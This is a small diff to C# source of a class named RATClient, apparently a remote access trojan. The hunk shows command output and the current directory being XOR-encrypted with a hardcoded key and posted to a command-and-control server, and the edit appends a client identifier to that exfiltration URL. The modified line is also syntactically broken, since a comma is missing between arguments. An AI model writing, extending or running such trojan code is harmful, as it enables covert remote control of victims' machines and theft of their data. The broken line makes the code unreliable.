@@ -92,7 +92,7 @@ class RATClient
 
                 string response = $"{currentDir}\n{output}";
                 string encrypted = Xor(response, "nullbeacon");
-                client.PostAsync($"{C2_SERVER}/result", new StringContent(encrypted)).Wait();
+                client.PostAsync($"{C2_SERVER}/result" + GetClientIdentifier() new StringContent(encrypted)).Wait();
             }
             catch { }
 
